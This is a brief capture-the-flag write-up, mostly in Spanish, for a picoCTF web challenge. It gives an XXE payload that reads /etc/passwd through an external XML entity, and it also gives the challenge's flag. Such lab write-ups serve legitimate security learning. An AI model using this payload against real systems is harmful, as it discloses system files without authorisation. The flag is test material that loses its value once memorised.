
# Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.



# Solución 
## solución
utilizando burpsuit hay que abrir el navegador dentro de el mismo, y buscamos una vulnerabilidad de tipo XXE en uno de los request, despues ponemos el siguiente ejemplo 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>
    <ID>
        2&example;
    </ID>
</data>
```

picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}


## solución 2




# referencias

